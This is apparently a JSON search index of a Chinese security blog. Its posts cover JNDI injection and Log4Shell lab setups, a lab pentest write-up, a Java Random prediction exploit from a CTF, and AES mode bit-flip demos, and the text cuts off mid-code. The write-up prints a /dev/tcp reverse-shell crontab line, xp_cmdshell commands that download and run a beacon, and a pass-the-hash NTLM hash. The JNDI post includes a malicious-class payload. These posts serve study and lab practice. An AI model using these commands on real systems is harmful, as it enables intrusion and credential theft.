{"meta":{"title":"Hexo","subtitle":"","description":"","author":"r1ngs","url":"https://0xr1ngs.github.io","root":"/"},"pages":[{"title":"文章归档","date":"2023-06-19T12:43:47.648Z","updated":"2023-06-18T07:49:56.844Z","comments":true,"path":"archive.html","permalink":"https://0xr1ngs.github.io/archive.html","excerpt":"","text":""}],"posts":[{"title":"Jndi注入","slug":"Java-Jndi","date":"2023-06-19T11:21:26.000Z","updated":"2023-07-10T09:13:55.994Z","comments":true,"path":"2023/06/19/Java-Jndi/","link":"","permalink":"https://0xr1ngs.github.io/2023/06/19/Java-Jndi/","excerpt":"","text":"JNDI注入JNDI全称为Java Naming and Directory Interface（Java命名和目录接口），是SUN公司提供的一种标准的Java命名系统接口 命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务 目录服务通常使用树状结构来组织信息，LDAP是典型的目录服务，Active Directory是LDAP在Windows上的实现，OpenLDAP 是在 Linux 上的实现 JNDI_RMI服务端： 123456789101112131415161718192021222324package org.RmiDemo;import java.rmi.Naming;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;public class Server &#123; public static class RMIInstance extends UnicastRemoteObject implements IHello&#123; // 绑定到RMI的对象的类必须要继承自UnicastRemoteObject，并且要实现一个继承自java.rmi.Remote的接口 // 构造方法 protected RMIInstance() throws RemoteException &#123; &#125; // 实现接口 @Override public String sayHello(String name) throws RemoteException &#123; return &quot;hello, &quot; + name; &#125; &#125; public static void main(String[] args) throws Exception &#123; LocateRegistry.createRegistry(1099); RMIInstance rmiInstance = new RMIInstance(); Naming.bind(&quot;rmi://127.0.0.1/hello&quot;,rmiInstance); &#125;&#125; 接口： 123456789package org.RmiDemo;import java.rmi.Remote;import java.rmi.RemoteException;public interface IHello extends Remote &#123; // 必须抛出java.rmi.RemoteException异常 String sayHello(String name) throws RemoteException;&#125; 客户端： 12345678910111213141516171819202122package org.RmiDemo;import javax.naming.Context;import javax.naming.InitialContext;import java.util.Hashtable;public class Client &#123; public static void main(String[] args) throws Exception&#123; // JNDI环境变量 Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1&quot;); // javax.naming.InitialContext上下文 Context initialContext = new InitialContext(env); Object obj = initialContext.lookup(&quot;hello&quot;); if (obj instanceof IHello)&#123; IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(&quot;world&quot;)); &#125; &#125;&#125; 动态协议转换:initialContext.lookup指定的参数可控 1234567891011121314151617package org.RmiDemo;import javax.naming.Context;import javax.naming.InitialContext;public class Client &#123; public static void main(String[] args) throws Exception&#123; // 不指定环境变量 Context initialContext = new InitialContext(); // 通过用户输入来动态识别调用的服务 Object obj = initialContext.lookup(&quot;rmi://127.0.0.1/hello&quot;); if (obj instanceof IHello)&#123; IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(&quot;world&quot;)); &#125; &#125;&#125; 则可以指定一个攻击者的rmi服务，实例化恶意类达成攻击。但是恶意类在服务器端并不存在，也就调用不了方法，因此需要Reference类。如果远程获取RMI服务上的对象为Reference类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。 12345678910// Constructs a new reference for an object with class name &#x27;className&#x27;, and the class name and location of the object&#x27;s factory.// Params:// className – The non-null class name of the object to which this reference refers. // factory – The possibly null class name of the object&#x27;s factory. // factoryLocation – The possibly null location from which to load the factory (e.g. URL)public Reference(String className, String factory, String factoryLocation) &#123; this(className); classFactory = factory; classFactoryLocation = factoryLocation;&#125; 1234567891011121314151617package org.RmiDemo;import java.rmi.Naming;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;public class Server &#123; public static void main(String[] args) throws Exception &#123; LocateRegistry.createRegistry(1099); Reference reference = new Reference(&quot;Arbitrary&quot;,&quot;Evil&quot;,&quot;&lt;http://127.0.0.1:8888/&gt;&quot;); // Reference没有继承UnicastRemoteObject，因此需要com.sun.jndi.rmi.registry.ReferenceWrapper进行包装 ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(&quot;rmi://127.0.0.1/hello&quot;,refObjWrapper); System.out.println(&quot;Server Running.&quot;); &#125;&#125; 在这个例子中，factory是工厂类，会去直接寻找 http://127.0.0.1:8888/Evil.class文件，然后实例化，我们可以直接在工厂类的构造方法中执行代码，或者在静态代码块中执行。因此，className可以是任意的。 Class.forName(name)会执行”类的初始化“，先后调用static、{}、构造函数 123456789101112131415import java.io.IOException;public class Evil &#123; public Evil() throws IOException &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException var1) &#123; throw new RuntimeException(var1); &#125; &#125;&#125; 然后用同版本（否则会报 Unsupported major.minor）jdk编译：javac [Evil.java](&lt;http://Evil.java&gt;) ，将其放入 http://127.0.0.1:8888 目录下，运行客户端代码即可弹出两次计算器（虽然会报 Evil cannot be cast to javax.naming.spi.ObjectFactory 但代码还是执行了）。 JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 JdbcRowSetImpl通过JdbcRowSetImpl也能触发： 123456789101112package org.RmiDemo;import com.sun.rowset.JdbcRowSetImpl;public class Client &#123; public static void main(String[] args) throws Exception&#123; System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;); JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl(); JdbcRowSetImpl_inc.setDataSourceName(&quot;rmi://127.0.0.1/hello&quot;); JdbcRowSetImpl_inc.setAutoCommit(true); &#125;&#125; 触发点在setAutoCommit，参数是true还是false没有影响。 实验环境为 jdk 1.8.0_202，由于trustURLCodebase为false，如果不手动开启的话会报错：Exception in thread &quot;main&quot; java.lang.ClassCastException: javax.naming.Reference cannot be cast to javax.sql.DataSource 快速搭建JNDI环境： https://github.com/welk1n/JNDI-Injection-Exploit https://github.com/mbechler/marshalsec 8u191以后可以通过加载本地危险工厂类实现代码执行 https://github.com/veracode-research/rogue-jndi Log4shell可以用Springboot启动一个环境，maven依赖如下配置 1234567891011121314151617181920212223&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--先排除...--&gt; &lt;exclusion&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.14.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 可以先测试是否能解析（高版本已经默认关闭解析）： 123Logger logger = LogManager.getLogger(BasicController.class);logger.error(&quot;name:&#123;&#125;&quot;, &quot;$&#123;java:runtime&#125;&quot;);logger.error(&quot;name:&#123;&#125;&quot;, &quot;$&#123;jndi:dns://d4b3766c.ipv6.1433.eu.org&#125;&quot;); 通过一个简单的controller测试： 12345678910111213141516@Controllerpublic class BasicController &#123; private static final Logger logger = LogManager.getLogger(BasicController.class); // &lt;http://127.0.0.1:8080/hello?name=lisi&gt; @RequestMapping(&quot;/hello&quot;) @ResponseBody public String hello(@RequestParam(name = &quot;name&quot;, defaultValue = &quot;unknown user&quot;) String name) &#123; logger.error(&quot;name: &quot; + name); return &quot;Hello &quot; + name; &#125;...//SpringDemoApplication.javaSystem.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);SpringApplication.run(SpringDemoApplication.class, args); 访问http://127.0.0.1:8080/hello?name=%24{jndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fcuizgz}即可执行恶意命令。","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"}]},{"title":"一次内网渗透测试","slug":"LGP-内网渗透","date":"2022-07-16T12:02:14.000Z","updated":"2023-07-10T09:14:54.112Z","comments":true,"path":"2022/07/16/LGP-内网渗透/","link":"","permalink":"https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"前言师兄搭建的一个学习环境，从SSRF到docker逃逸再到mssql和PTH移动，记录一下WP 外网跳板http://192.168.34.244/ 不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用 /proc/self/cwd Linux proc &#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 /proc/self/cwd是一个软连接，指向用户目录，如果是web用户就指向web目录，也可以用来绕过，还比如 /proc/net/arp 深入理解linux系统下proc文件系统内容 - zhezhelin - 博客园 可以看 /etc/hosts 这台的ip是172.17.0.2，arp还能看到一个.0.1 web目录留了一个phpshell和root密码，可以直接查找匹配&#x2F;etc文件夹下的所有文件 grep -rn &quot;root&quot; * 在蚁剑的shell里面不能 su root,这样没法输密码，直接就会返回 Password: su: Authentication failure 可以弹一个 meterpreter，在 meterpreter里进入shell，然后用 su root，然后再以root权限执行 shell.elf,这样就可以获得一个root的 meterpreter docker 逃逸特权模式挂载用户目录 123fdisk -lmkdir /testmount /dev/sda1 /test 这样相当于把宿主机的根目录挂载到了 /test 可以通过 test进行文件读写。 但是不能直接去 test目录执行 /bin/bash 只能通过写入 ssh key或者 crontab的形式 但是注意，不能直接把反弹shell的命令写到任务里，而是应该写入一个sh文件 12*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.33.116/12501 0&gt;&amp;1 ❌*/1 * * * * root bash /tmp/shell.sh ✅ 原因： 解决ubuntu crontab反弹shell失败的问题 简单来说就是 centos里面的 cron中执行的 shell环境是 /bin/sh，ubuntu中 /bin/sh这个软连接指向了 dash 。但是不执行 dash直接执行 /test/bin/bash也是不行的。因为没有用 chroot切换 /test为根目录，而且弹过来的也不是宿主机的 shell，因为这样相当于在原来基础上只是加了一个 /bin/bash而已 同时，如果前面的crontab任务有错，后面的应该也是不执行的，比如前一句忘了写执行的用户 /etc/crontab 和 /var/spool/cron区别：/var/spool/cron/这个目录是以账号来区分每个用户自己的执行计划，而 /etc/crontab系统执行计划，需要在五个*后面加上用户，比如上面没有写到 /etc/crontab没有加root就是错误的 然后现在通过反弹的shell再弹 meterpreter就有宿主机shell了 内网移动mssql123456789101112131415[+] NetInfo:[*]172.16.2.4 [-&gt;]MSSQL [-&gt;]172.16.2.4[+] NetInfo:[*]172.16.2.2 [-&gt;]outx-rivate-PC [-&gt;]172.16.2.2[+] NetInfo:[*]172.16.2.1 [-&gt;]DC [-&gt;]172.16.2.1[+] 172.16.2.1 MS17-010 (Windows Server 2012 R2 Datacenter 9600)[+] 172.16.2.2 MS17-010 (Windows 7 Professional 7601 Service Pack 1) 不拿17-010打了，打 mssql ，密码在web配置文件里有，但是这台mssql只连通 172.16.2.0网段，要反弹回来的话只能在跳板机做一个端口转发，跳板机做server，攻击机做client，payload反弹到server的 12001端口相当于反弹到了client的 12001端口，listener这样设置 172.16.2.12就是跳板机的一个网卡ip，攻击机的 frpc.ini 配置为 123456789101112[common]tls_enable = truetoken = qax_scuserver_addr = 192.168.34.244server_port = 7200[http_proxy]type = tcpremote_port =12001plugin=http_proxylocal_port =12001local_ip =127.0.0.1 然后不能用cs直接通过listener生成payload，然后mssql_exec执行，因为经过排查后发现这样生成的payload根本没有走http流量，可能是个cs的bug，所以只能生成exe文件然后下载执行。 其次，msf的mssql_exec模块如果返回有中文字符会直接报错，建议直接用navicat 跳板机有python3，起一个http.server就可以，然后下载到progamdata执行 12exec master..xp_cmdshell &quot;powershell Invoke-WebRequest &lt;http://172.16.2.12:12345/beacon.exe&gt; -OutFile C://programdata/beacon.exe&quot;exec master..xp_cmdshell &quot;C://programdata/beacon.exe&quot; 提权mssql是 nt/service权限，用 ms16-075一键提权，弹回新的shell，然后hashdump和mimikatz hashdump 安全账户管理器（SAM）是Windows XP、Windows Vista、Windows 7、8.1、10和11中的一个数据库文件，用于存储用户的密码。它可以用来验证本地和远程用户。从Windows 2000 SP4开始，活动目录（AD）对域用户的尝试登陆进行认证。SAM使用加密措施来防止未经认证的用户访问系统。 SAM数据库文件存储在C:\\Windows\\System32\\config中。该文件中的所有数据都是加密的。密码哈希值存储在HKEY_LOCAL_MACHINE&#x2F;SAM中。即使它存储在本地，任何系统用户在运行时都不能访问该文件。出于安全考虑，对SAM的访问有不同的权限。访问它需要HKLM&#x2F;SAM和SYSTEM的权限。 hashdump是pwdump工具的内存版本，但它不是将DLL加载到LSASS.exe，而是在进程中分配内存，注入原始汇编代码，通过CreateRemoteThread执行，然后从内存中读回捕获的哈希值。 hashdump返回的结果格式为： Username:RID:LM-HASH:NTLM-HASH cmd5支持NTLM解密 mimikatz Mimikatz是一个开源的应用程序，允许用户查看和保存认证凭证，如Kerberos门票。 本地安全授权服务器服务（LSASS）是微软Windows操作系统中的一个进程，负责执行系统的安全策略。它验证登录到Windows计算机或服务器的用户，处理密码变更，并创建访问令牌。 它还会向Windows安全日志写入内容。 Windows使用的lsass.exe文件位于%WINDIR%\\System32目录下，该文件的描述是本地安全授权进程。强行终止lsass.exe会导致系统失去对任何账户的访问权，包括NT AUTHORITY，促使机器重新启动。 深入分析Mimikatz：WDigest 大概原理就是将任意DLL载入LSASS PTH原理一台windows计算机要么属于一个工作组，要么属于一个域。工作组中的每一台计算机在网络中地位平等，是独立管理的个体。域的优点在于1）集中的统一账户、资源管理。2）工作站的有效配置和安全性严密控制（比如给所有机器统一发放补丁等）。当计算机数量比较多，大型企业中网络规模大，需要统一的管理和集中的身份验证，并且能够给用户提供方便的搜索和使用网络资源的方式就应该使用域。域用户信息保存在活动目录(AD)中。 域是Windows计算机网络的一种形式，其中所有用户帐户 、计算机、打印机和其他安全主体都在位于称为域控制器（DC）的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行， 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配相应的该域内资源的访问权限。 从Windows Server 2003开始 ， Active Directory是负责维护该中央数据库的Windows组件。 内网渗透入门–域相关概念 AD 域服务简介（一）- 基于 LDAP 的 AD 域服务器搭建及其使用 浅探内网横向移动-Pass The Hash - 先知社区 自window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash 1234567shell net user /domain\\\\\\\\DC.outx.com 的用户帐户-------------------------------------------------------------------------------Administrator Guest krbtgt outx 命令成功完成。 其中，KRBTGT账户是一个本地默认账户，作为密钥分发中心（KDC）服务的一个服务账户。这个账户不能被删除，账户名称也不能被改变。KRBTGT账户不能在活动目录中启用。在创建域的时候会自动创建这个账户。 IPC$及利用1234567891011121314151617181920beacon&gt; net share[*] Tasked beacon to run net share on localhost[+] host called home, sent: 105058 bytes[+] received output:Shares at \\\\\\\\localhost: Share name Comment ---------- ------- ADMIN$ 远程管理 C$ 默认共享 IPC$ 远程 IPCpth .\\\\outx ecde4d7a314541d34854ec83c114634bshell dir \\\\\\\\dc\\\\c$#当访问softer计算机中名为it168的共享文件夹，用UNC表示就是\\\\\\\\softer\\\\it168；#如果是softer计算机的默认管理共享C$则用\\\\\\\\softer\\\\c$来表示。#如果继续：shell dir \\\\\\\\dc\\\\c$\\\\Users IPC$共享是由Windows服务器服务创建的。这个特殊共享的存在是为了允许后续的命名管道连接到服务器。服务器的命名管道是由内置的操作系统组件和安装在系统上的任何应用程序或服务创建的。当命名管道被创建时，该进程指定了与该管道相关的安全性。然后，它确保 只向指定的用户或组授予访问权 。 IPC$共享也被称为空会话连接。通过使用该会话，Windows允许匿名用户执行某些活动，如列举域账户和网络共享的名称。 net use：将一台计算机连接到共享资源，或将一台计算机从共享资源中断开，或显示有关计算机连接的信息。 12net use \\\\\\\\靶机ip地址\\\\ipc$ &quot;密码&quot; /user:&quot;用户名&quot;net use 然后可以通过这个链接上传文件等等，比如 copy user.bat \\\\\\\\192.168.1.108\\\\c$ IPC$入侵大全 CS攻击在cs里，视图⇒目标⇒添加目标，添加DC，输入ip地址，然后psexec PsExec是一个轻量级的telnet替代软件，可以让你在其他系统上执行程序，为控制台应用程序提供完整的交互性，而不需要手动安装客户端软件。PsExec最强大的用途包括在远程系统上启动交互式命令程序和远程启用工具，如IpConfig，否则就不能显示远程系统的信息。 横向移动 - PsExec 的使用 直接就上线了，PC机也可以这么做","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://0xr1ngs.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"Java Random方法的安全问题","slug":"java-random","date":"2019-05-31T08:37:35.000Z","updated":"2023-07-10T09:14:22.000Z","comments":true,"path":"2019/05/31/java-random/","link":"","permalink":"https://0xr1ngs.github.io/2019/05/31/java-random/","excerpt":"","text":"前言起源于强网杯的密码学题目random study java.util.Random题目中challenge two的主要代码如下： 1234567o = subprocess.check_output([&quot;java&quot;, &quot;Main&quot;])tmp=[]for i in o.split(&quot;\\n&quot;)[0:3]: tmp.append(int(i.strip()))v1=tmp[0] % 0xffffffffv2=tmp[1] % 0xffffffffv3=tmp[2] % 0xffffffff 还给了一个Main.class文件，打开发现是字节码，用jd-gui反编译得到源码如下： 12345678public class Main &#123; public static void main(String[] paramArrayOfString) &#123; Random random = new Random(); System.out.println(random.nextInt()); System.out.println(random.nextInt()); System.out.println(random.nextInt()); &#125;&#125; 代码的意思很简单，调用random.nextInt方法生成三个连续的随机数，要求根据前两个随机数去预测第三个随机数 源码分析为了了解这个方法出现的安全问题的原理，有必要去查看一下这个方法的源代码 在eclipse中将光标移动到nextInt处按F3可以追踪到jdk包里的具体代码 可以看到它直接调用了next方法，传递的参数是32。 继续追踪next方法 可以看到前一个随机数种子和后一个随机数种子都是定义为long类型的，方法返回的值就是下一个种子右移16位然后强转为int的结果 while里的compareAndSet方法只是比较当前的种子值是否为oldseed，如果是的话就更新为nextseed而已，一般都会返回true 而下一个种子的更新算法就在do-while循环里面：nextseed = (oldseed * multiplier + addend) &amp; mask，种子的初始值是将当前系统时间带入运算的结果 可以在类定义的开头处看到这几个常量属性的值 而这个种子的更新算法本质上就是一个线性同余生成器 线性同余生成器（LCG）LCG是形如这样的式子： 和上面的代码对比可以看出是基本一致的，因为和mask常量做与运算就相当于是舍弃高位，保留2进制的低48位，也就相当于模2的48次方 那么我们既然都有了常量的值了，我们就可以去做第三个随机数的预测了 预测方法很简单，如果把生成第一个随机数的种子定义为seed1，seed2、seed3往后顺延的话 seed1右移16位就是第一个随机数的值，也就是说第一个随机数就丢失了16位，所以seed1就有2的16次方种可能，那么把这2的16次方种可能带入计算下一个seed2，并且右移查看是否和第二个随机数相等就能知道是否正确找到了seed1了 先看一组简单的测试样例，输出的三个随机数都是正数 12345678910111213141516171819a = 0x5DEECE66DLb = 0xBLmask = (1L &lt;&lt; 48) - 1def findseed(x1, x2): seed = x1 &lt;&lt; 16 for i in range(2 ** 16): if ((a * seed + b) &amp; mask) &gt;&gt; 16 == x2: return seed seed += 1if __name__ == &#x27;__main__&#x27;: x1 = 1564370740 x2 = 2121441037 seed1 = findseed(x1, x2) seed2 = (a * seed1 + b) &amp; mask x3 = ((a * seed2 + b) &amp; mask) &gt;&gt; 16 print x3 通过测试，结果正确 但是你可能会好奇为什么测试的java代码有时候会输出负数，因为右移1位是相当于除以2的，一个正数除以一个正数怎么会得到一个负数呢？ 实际上这是由于java代码中的int强制类型转换和&gt;&gt;&gt;无符号右移所造成的 补码先来回顾一下java的int类型，int类型占四个字节，也就是二进制的32位 计算机中的数字通常用二进制补码表示，最高位为符号位，正数为0，负数为1，所以表示数值的一共有31位，故int类型的最小值为-2147483648（-2的31次方）最大值为 2147483647（2的31次方-1） 你可能会好奇为什么负数比正数多表示了1位，因为自然数0就是用全为0（包括符号位）的二进制表示的，而到负数那里是没有负0的概念的，所以可以多表示一个数 接下来可以开始说&gt;&gt;&gt;的意思了 java中有两种右移，一种是&gt;&gt;，代表逻辑上的右移(除以)，高位补为符号位；一种是&gt;&gt;&gt;代表无符号右移，高位直接补0 看一下这种情况： 前两个为正数，但是第三个为负数，我们先按照上面的方法计算出seed3和它右移16位的结果： 12345678910111213141516171819202122a = 0x5DEECE66DLb = 0xBLmask = (1L &lt;&lt; 48) - 1def findseed(x1, x2): seed = x1 &lt;&lt; 16 for i in range(2 ** 16): if ((a * seed + b) &amp; mask) &gt;&gt; 16 == x2: return seed seed += 1if __name__ == &#x27;__main__&#x27;: x1 = 1135971603 x2 = 1130772191 seed1 = findseed(x1, x2) seed2 = (a * seed1 + b) &amp; mask seed3 = (a * seed2 + b) &amp; mask print seed3 print seed3.bit_length() print &#x27;&#123;:064b&#125;&#x27;.format(seed3) print &#x27;&#123;:064b&#125;&#x27;.format(seed3&gt;&gt;16) 输出结果为 12341416351489903184800000000000000001000000011010001000000001011111001000111011011100000000000000000000000000000000010000000110100010000000010111110 这样就能看出问题在哪了，由于seed3右移了16位以后除了补0的高位就只有32位了，使用int强转以后java把它从long类型转换成了int，并且自动忽略了32位以后的高位，这就相当于我们得到的第三个随机数用补码表示为 10000000110100010000000010111110 可以看出来最高位为1，也就是说这个补码代表了一个负数，那么我们怎么通过补码找到这个负数的真值呢？很简单，对补码再求一次补码就行了，也就是取反后加1。 即 01111111001011101111111101000010，对应的二进制位2133786434，所以第三个随机数应该为-2133786434，如此一来，我们就可以通过负数找到其对应的seed了 exp最终通过两个随机数预测第三个随机数的exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940a = 0x5DEECE66DLb = 0xBLmask = (1L &lt;&lt; 48) - 1def n2p(x): y = -x y ^= 2 ** 32 - 1 #取反 y += 1 return ydef findseed(x1, x2): if x1 &lt; 0: x1 = n2p(x1) if x2 &lt; 0: x2 = n2p(x2) seed = x1 &lt;&lt; 16 for i in range(2 ** 16): if ((a * seed + b) &amp; mask) &gt;&gt; 16 == x2: return seed seed += 1def cal_x(seed): x = seed&gt;&gt;16 if &#x27;&#123;:032b&#125;&#x27;.format(x).startswith(&#x27;1&#x27;): x ^= 2 ** 32 - 1 x += 1 return -x return xif __name__ == &#x27;__main__&#x27;: x1 = 187562908 x2 = 1663125607 seed1 = findseed(x1, x2) seed2 = (a * seed1 + b) &amp; mask seed3 = (a * seed2 + b) &amp; mask x3 = cal_x(seed3) print x3 经过测试，无论x1或者x2是否为负数，都可以准确预测 总结以前学习LCG的时候，只是知道了它的原理，并没有接触到它在实际情况中的应用，通过这次比赛，学到了java的random方法的安全漏洞，同时也十分感谢出题人提供的学习机会","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"}]},{"title":"对字节反转攻击的深入研究","slug":"cbc-bit-flip","date":"2019-03-28T08:28:53.000Z","updated":"2023-07-10T09:13:19.810Z","comments":true,"path":"2019/03/28/cbc-bit-flip/","link":"","permalink":"https://0xr1ngs.github.io/2019/03/28/cbc-bit-flip/","excerpt":"","text":"对字节反转攻击的深入研究前言现在无论你是google还是百度，”字节反转攻击”的搜索结果整整几页都是”CBC字节反转攻击”，看来字节反转攻击和CBC模式结合的想法已经可以说是深入人心，毕竟它的名字就叫”CBC反转字节攻击”，但是不是这种攻击只有CBC分组模式才有呢？如果不用CBC分组模式，是不是就不存在这种重放攻击呢？笔者就这个问题进行了研究。 CBCCBC模式下的字节反转攻击想必大家都不陌生了，这种攻击方式和分组加密的加密算法无关，是在处理明文加密后的密文块时出现了漏洞：前一块的密文可以影响后一块的明文。 这种图引用自国外一个大佬的文章，攻击手法是简单明了的： C1 xor D(C2) &#x3D; P2 那么我们令C1&#x3D;C1 xor P2 xor P发送给服务器，其中P是我们想要篡改的明文，那么服务器会计算： (C1 xor P2 xor P) xor D(C2) &#x3D; (P2 xor D(C2)) xor P2 xor P xor D(C2) &#x3D; P 也就达到了篡改的效果，下面是作者自己写的测试demo 123456789101112131415161718192021222324from Crypto.Cipher import AESfrom os import urandomfrom Crypto.Util.strxor import strxorclass AES_CBC: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_CBC, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_CBC, self.iv) return aes.decrypt(cipher)plain = &#x27;1&#x27;*32aes = AES_CBC()cipher = aes.encrypt(plain)print aes.decrypt(cipher)cipher = strxor(strxor(cipher[:16], &#x27;1&#x27;*16), &#x27;2&#x27;*16)+cipher[16:]print aes.decrypt(cipher) 运行结果为： 前16个字节乱码是因为我们篡改了C1后，对应的D(C1)也发生了改变 CFBCFB模式可以将块密码转换为同步的流密码。流密码通俗点讲就是将明文逐字节的进行加密，它生成密钥流块，然后与明文块进行异或，然后获得密文。 先来看一下CFB的加解密模式吧，图片选自wikipedia： 那么按道理说，我们如果将密文的第一块反转，那么明文的第一块也应该被对应篡改，但事实并非如此，我们看这个测试demo 123456789101112131415161718192021222324from Crypto.Cipher import AESfrom os import urandomfrom Crypto.Util.strxor import strxorclass AES_CFB: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.decrypt(cipher)plain = &#x27;1&#x27;*32aes = AES_CFB()cipher = aes.encrypt(plain)print aes.decrypt(cipher)ct = strxor(strxor(cipher[:16], &#x27;1&#x27;*16), &#x27;2&#x27;*16)+cipher[16:]print aes.decrypt(ct) 运行结果如下： 一片乱码？但是如果你仔细观察的话，会发现其实第一个字符已经被改成了2，那为什么后面的都是乱码呢？ 我们修改一下代码，只更改第一个字符： 1ct = strxor(strxor(cipher[:1], &#x27;1&#x27;*1), &#x27;2&#x27;*1)+cipher[1:] 程序运行结果如下： 第一个字符依然是2，但是为什么后面有15个字符没有被篡改呢？ 其实，wikipedia的图并不能很好的展示CFB的工作模式 ，真实的CFB模式是这样的： 图中的Shift register代表的是移位寄存器，图中的s一般代表的是8bit也就是1字节，同时，如果我们更改了Ci，那么Ci是要被存放到下一个移位寄存器里的，并且这个Ci会一直保存在寄存器里，直到它慢慢从寄存器移出去，所以这个Ci会影响128&#x2F;8&#x3D;16个字节的明文，故最后有32-1-16&#x3D;15个字节的明文没有受影响，所以，CFB模式也是有字节反转攻击的，只是我们每次只能改动一个字节，完整的攻击demo如下： 12345678910111213141516171819202122232425262728from Crypto.Cipher import AESfrom os import urandomfrom Crypto.Util.strxor import strxorclass AES_CFB: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.decrypt(cipher)plain = &#x27;1&#x27;*32aes = AES_CFB()cipher = aes.encrypt(plain)print aes.decrypt(cipher)for i in range(32): pt = aes.decrypt(cipher) cipher = cipher[:i]+strxor(strxor(cipher[i], pt[i]), &#x27;2&#x27;)+cipher[i+1:] print aes.decrypt(cipher) 程序运行结果为： OFBOFB和CFB类似，也是将块密码转换为流密码的一种分组模式，加解密图示如下： 可以从解密模式发现，OFB模式和CBC模式比较相似，并且如果其中一块的密文进行了改变的话，并不会影响它后面的密文 所以类似的，OFB模式也存在字节反转攻击，同时由于流密码的性质，我们可以很简单的做到对明文任意长度字符的篡改 demo如下： 1234567891011121314151617181920212223242526from Crypto.Cipher import AESfrom os import urandomfrom Crypto.Util.strxor import strxorclass AES_OFB: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_OFB, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_OFB, self.iv) return aes.decrypt(cipher)plain = &#x27;1&#x27;*32aes = AES_OFB()cipher = aes.encrypt(plain)print aes.decrypt(cipher)for i in range(32): ct = strxor(strxor(cipher[:i+1], 